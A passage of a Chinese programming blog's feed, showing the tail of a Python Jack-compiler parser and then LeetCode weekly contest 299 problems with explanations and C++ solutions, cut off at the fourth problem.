self.parser.keyWord() == <span class="string">&quot;true&quot;</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">&quot;false&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">               self.parser.keyWord() == <span class="string">&quot;null&quot;</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">&quot;this&quot;</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;inValid expression define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="keyword">if</span> self.parser.symbol() == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">                <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.compileExpression()</span><br><span class="line">                <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">                   self.parser.symbol() == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;valid term define!\n&quot;</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">                (self.parser.symbol() == <span class="string">&quot;-&quot;</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">&quot;~&quot;</span>):</span><br><span class="line">                <span class="comment"># parse unaryOp</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse term</span></span><br><span class="line">                self.compileTerm()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;valid term define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            <span class="comment"># parse subroutineName or varName</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;[&quot;</span>:</span><br><span class="line">                <span class="comment"># parse &#x27;[&#x27;</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.compileExpression()</span><br><span class="line">                <span class="comment"># parse &#x27;]&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;]&quot;</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;valid term define!\n&quot;</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;.&quot;</span>:</span><br><span class="line">                <span class="comment"># parse &#x27;.&#x27;</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse subroutineName</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;valid term define!\n&quot;</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;valid term define!\n&quot;</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                self.compileExpressionList()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;valid term define!\n&quot;</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                self.compileExpressionList()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;valid term define!\n&quot;</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/term&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileExpressionList</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;expressionList&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.symbol() == <span class="string">&#x27;)&#x27;</span> <span class="keyword">and</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            self.upperLevel()</span><br><span class="line">            self.compileOut(<span class="string">&quot;&lt;/expressionList&gt;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse `, expression`</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.symbol() == <span class="string">&#x27;,&#x27;</span> <span class="keyword">and</span> \</span><br><span class="line">              self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="comment"># parse &#x27;,&#x27;</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            self.compileExpression()</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/expressionList&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    parser = CompilationEngine(<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>build a computer</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest 299</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/12/</url>
    <content><![CDATA[<h2 id="leetcode-contest-299"><a href="#leetcode-contest-299" class="headerlink" title="leetcode  contest 299"></a>leetcode  contest 299</h2><p>前三题基本上都是套路题了，第四题还是有点难度。</p>
<h3 id="2319-判断矩阵是否是一个-X-矩阵"><a href="#2319-判断矩阵是否是一个-X-矩阵" class="headerlink" title="2319. 判断矩阵是否是一个 X 矩阵"></a>2319. 判断矩阵是否是一个 X 矩阵</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>如果一个正方形矩阵满足下述 全部 条件，则称之为一个 <code>X</code> 矩阵 ：</p>
<p>矩阵对角线上的所有元素都 不是 <code>0</code><br>矩阵中所有其他元素都是 <code>0</code><br>给你一个大小为 <code>n x n</code> 的二维整数数组 <code>grid</code> ，表示一个正方形矩阵。如果 <code>grid</code> 是一个 <code>X</code> 矩阵 ，返回 <code>true</code> ；否则，返回 false 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[2,0,0,1],[0,3,1,0],[0,5,2,0],[4,0,0,2]]</span><br><span class="line">输出：true</span><br><span class="line">解释：矩阵如上图所示。</span><br><span class="line">X 矩阵应该满足：绿色元素（对角线上）都不是 0 ，红色元素都是 0 。</span><br><span class="line">因此，grid 是一个 X 矩阵。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[5,7,0],[0,3,1],[0,5,0]]</span><br><span class="line">输出：false</span><br><span class="line">解释：矩阵如上图所示。</span><br><span class="line">X 矩阵应该满足：绿色元素（对角线上）都不是 0 ，红色元素都是 0 。</span><br><span class="line">因此，grid 不是一个 X 矩阵。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == grid.length == grid[i].length</code></li>
<li><code>3 &lt;= n &lt;= 100</code></li>
<li><code>0 &lt;= grid[i][j] &lt;= 105</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-299/problems/check-if-matrix-is-x-matrix/">https://leetcode.cn/contest/weekly-contest-299/problems/check-if-matrix-is-x-matrix/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接遍历判断对角线元素和非对角线元素的值即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2)$, 其中 $n$ 为矩阵的行数。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkXMatrix</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == j || (i + j) == n - <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (grid[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (grid[i][j] != <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2320-统计放置房子的方式数"><a href="#2320-统计放置房子的方式数" class="headerlink" title="2320. 统计放置房子的方式数"></a>2320. 统计放置房子的方式数</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>一条街道上共有 <code>n * 2</code> 个 地块 ，街道的两侧各有 <code>n</code> 个地块。每一边的地块都按从 <code>1</code> 到 <code>n</code> 编号。每个地块上都可以放置一所房子。</p>
<ul>
<li>现要求街道同一侧不能存在两所房子相邻的情况，请你计算并返回放置房屋的方式数目。由于答案可能很大，需要对 <code>109 + 7</code> 取余后再返回。</li>
</ul>
<p>注意，如果一所房子放置在这条街某一侧上的第 i 个地块，不影响在另一侧的第 i 个地块放置房子。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 1</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">可能的放置方式：</span><br><span class="line">1. 所有地块都不放置房子。</span><br><span class="line">2. 一所房子放在街道的某一侧。</span><br><span class="line">3. 一所房子放在街道的另一侧。</span><br><span class="line">4. 放置两所房子，街道两侧各放置一所。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2</span><br><span class="line">输出：9</span><br><span class="line">解释：如上图所示，共有 9 种可能的放置方式。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 104</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-299/problems/count-number-of-ways-to-place-houses/">https://leetcode.cn/contest/weekly-contest-299/problems/count-number-of-ways-to-place-houses/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>动态规划
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单的动态规划，设 $x &#x3D; {0,1,2,3}$ 分别表示道路两侧的房子的状态，则递推公式如下:<br>$$<br>dp[i][0] &#x3D; (dp[i-1][0] + dp[i-1][1] + dp[i-1][2] + dp[i-1][3]) \<br>dp[i][1] &#x3D; (dp[i-1][0] + dp[i-1][2])  \<br>dp[i][2] &#x3D; (dp[i-1][0] + dp[i-1][1])  \<br>dp[i][3] &#x3D; (dp[i-1][0]) \<br>$$</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为街道地块的数目。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为街道地块的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countHousePlacements</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">4</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            dp[<span class="number">1</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>] + dp[i<span class="number">-1</span>][<span class="number">1</span>] + dp[i<span class="number">-1</span>][<span class="number">2</span>] + dp[i<span class="number">-1</span>][<span class="number">3</span>]) % mod;</span><br><span class="line">            dp[i][<span class="number">1</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>] + dp[i<span class="number">-1</span>][<span class="number">2</span>]) % mod;</span><br><span class="line">            dp[i][<span class="number">2</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>] + dp[i<span class="number">-1</span>][<span class="number">1</span>]) % mod;</span><br><span class="line">            dp[i][<span class="number">3</span>] = (dp[i<span class="number">-1</span>][<span class="number">0</span>]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            res = (res + dp[n][i]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2321-拼接数组的最大分数"><a href="#2321-拼接数组的最大分数" class="headerlink" title="2321. 拼接数组的最大分数"></a>2321. 拼接数组的最大分数</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你两个下标从 <code>0</code> 开始的整数数组 <code>nums1</code> 和 <code>nums2</code> ，长度都是 n 。</p>
<p>你可以选择两个整数 <code>left</code> 和 <code>right</code> ，其中 <code>0 &lt;= left &lt;= right &lt; n</code> ，接着 交换 两个子数组 <code>nums1[left...right]</code> 和 <code>nums2[left...right]</code> 。</p>
<p>例如，设 <code>nums1 = [1,2,3,4,5]</code> 和 <code>nums2 = [11,12,13,14,15]</code> ，整数选择 <code>left = 1</code> 和 <code>right = 2</code>，那么 <code>nums1</code> 会变为 <code>[1,12,13,4,5]</code> 而 <code>nums2</code> 会变为 <code>[11,2,3,14,15]</code> 。<br>你可以选择执行上述操作 一次 或不执行任何操作。</p>
<p>数组的 分数 取 <code>sum(nums1)</code> 和 <code>sum(nums2)</code> 中的最大值，其中 <code>sum(arr)</code> 是数组 <code>arr</code> 中所有元素之和。</p>
<p>返回 可能的最大分数 。</p>
<p>子数组 是数组中连续的一个元素序列。<code>arr[left...right]</code> 表示子数组包含 <code>nums</code> 中下标 <code>left</code> 和 <code>right</code> 之间的元素（含 下标 <code>left</code> 和 <code>right</code> 对应元素）。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [60,60,60], nums2 = [10,90,10]</span><br><span class="line">输出：210</span><br><span class="line">解释：选择 left = 1 和 right = 1 ，得到 nums1 = [60,90,60] 和 nums2 = [10,60,10] 。</span><br><span class="line">分数为 max(sum(nums1), sum(nums2)) = max(210, 80) = 210 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [20,40,20,70,30], nums2 = [50,20,50,40,20]</span><br><span class="line">输出：220</span><br><span class="line">解释：选择 left = 3 和 right = 4 ，得到 nums1 = [20,40,20,40,20] 和 nums2 = [50,20,50,70,30] 。</span><br><span class="line">分数为 max(sum(nums1), sum(nums2)) = max(140, 220) = 220 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums1 = [7,11,13], nums2 = [1,1,1]</span><br><span class="line">输出：31</span><br><span class="line">解释：选择不交换任何子数组。</span><br><span class="line">分数为 max(sum(nums1), sum(nums2)) = max(31, 3) = 31 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == nums1.length == nums2.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= nums1[i], nums2[i] &lt;= 104</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-299/problems/maximum-score-of-spliced-array/">https://leetcode.cn/contest/weekly-contest-299/problems/maximum-score-of-spliced-array/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>最长连续子数组和
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>仔细一看结果是最长连续子数组和的变形，我们设数组 $arr1$ 为 $[{nums2}[0]-\textit{nums1}[0], {nums2}[1]-\textit{nums1}[1], {nums2}[2]-\textit{nums1}[2], {nums2}[3]-\textit{nums1}[3], \cdots]$。我们只需要找到数组 $arr1$ 中的最大的连续子数组和 即可，然后将最大的子数组和加上 $nums1$ 的和，即为将数组 $2$ 替换数组 $1$ 的最大分数，同理我们可以求出数组 $1$ 替换 数组 $2$ 的最大分数。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$, $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，$n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumsSplicedArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum1</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum2</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum1[i + <span class="number">1</span>] = sum1[i] + nums1[i];</span><br><span class="line">            sum2[i + <span class="number">1</span>] = sum2[i] + nums2[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="built_in">max</span>(sum1[n], sum2[n]);</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp1</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp2</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp1[i + <span class="number">1</span>] = <span class="built_in">max</span>(nums2[i] - nums1[i], dp1[i] + nums2[i] - nums1[i]);</span><br><span class="line">            dp2[i + <span class="number">1</span>] = <span class="built_in">max</span>(nums1[i] - nums2[i], dp2[i] + nums1[i] - nums2[i]);</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, sum1[n] + dp1[i + <span class="number">1</span>]);</span><br><span class="line">            ans = <span class="built_in">max</span>(ans, sum2[n] + dp2[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h3 id="2322-从树中删除边的最小分数"><a href="#2322-从树中删除边的最小分数" class="headerlink" title="2322. 从树中删除边的最小分数"></a>2322. 从树中删除边的最小分数</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>存在一棵无向连通树，树中有编号从 <code>0</code> 到 <code>n - 1</code> 的 <code>n</code> 个节点， 以及 <code>n - 1</code> 条边。</p>
<p>给你一个下标从 <code>0</code> 开始的整数数组 <code>nums</code> ，长度为 <code>n</code> ，其中 <code>nums[i]</code> 表示第 <code>i</code> 个节点的值。另给你一个二维整数数组 <code>edges</code> ，长度为 <code>n - 1</code> ，其中 <code>edges[i] = [ai, bi]</code> 表示树中存在一条位于节点 <code>ai</code> 和 <code>bi</code> 之间的边。</p>
<p>删除树中两条 不同 的边以形成三个连通组件。对于一种删除边方案，定义如下步骤以计算其分数：</p>
<ul>
<li>分别获取三个组件 每个 组件中所有节点值的异或值。</li>
<li>最大 异或值和 最小 异或值的 差值 就是这一种删除边方案的分数。<br>例如，三个组件的节点值分别是：<code>[4,5,7]</code>、<code>[1,9]</code> 和 <code>[3,3,3]</code> 。三个异或值分别是 <code>4 ^ 5 ^ 7 = 6、1 ^ 9 = 8</code> 和 <code>3 ^ 3 ^ 3 = 3</code> 。最大异或值是 <code>8</code> ，最小异或值是 <code>3</code> ，分数是 <code>8 - 3 = 5 </code>。<br>返回在给定树上执行任意删除边方案可能的 最小 分数。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,5,5,4,11], edges = [[0,1],[1,2],[1,3],[3,4]]</span><br><span class="line">输出：9</span><br><span class="line">解释：上图展示了一种删除边方案。</span><br><span class="line">- 第 1 个组件的节点是 [1,3,4] ，值是 [5,4,11] 。异或值是 5 ^ 4 ^ 11 = 10 。</span><br><span class="line">- 第 2 个组件的节点是 [0] ，值是 [1] 。异或值是 1 = 1 。</span><br><span class="line">- 第 3 个组件的节点是 [2] ，值是 [5] 。异或值是 5 = 5 。</span><br><span class="line">分数是最大异或值和最小异或值的差值，10 - 1 = 9 。</span><br><span class="line">可以证明不存在分数比 9 小的删除边方案。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [5,5,2,4,4,2], edges = [[0,1],[1,2],[5,2],[4,3],[1,3]]</span><br><span class="line">输出：0</span><br><span class="line">解释：上图展示了一种删除边方案。</span><br><span class="line">- 第 1 个组件的节点是 [3,4] ，值是 [4,4] 。异或值是 4 ^ 4 = 0 。</span><br><span class="line">- 第 2 个组件的节点是 [1,0] ，值是 [5,5] 。异或值是 5 ^ 5 = 0 。</span><br><span class="line">- 第 3 个组件的节点是 [2,5] ，值是 [2,2] 。异或值是 2 ^ 2 = 0 。</span><br><span class="line">分数是最大异或值和最小异或值的差值，0 - 0 = 0 。</span><br><span class="line">无法获得比 0 更小的分数 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == nums.length</code></li>
<li><code>3 &lt;= n &lt;= 1000</code></li>
<li><code>1 &lt;= nums[i] &lt;= 108</code></li>
<li><code>edges.length == n - 1</code></li>
<li><code>edges[i].length == 2</code></li>
<li><code>0 &lt;= ai, bi &lt; n</code></li>
<li><code>ai != bi</code></li>
<li><code>edges</code> 表示一棵有效的树</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-299/problems/minimum-score-after-removals-on-a-tree/">https://leetcode.cn/contest/weekly-contest-299/problems/minimum-score-after-removals-on-a-tree/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>深度优先搜索
</code></pre>
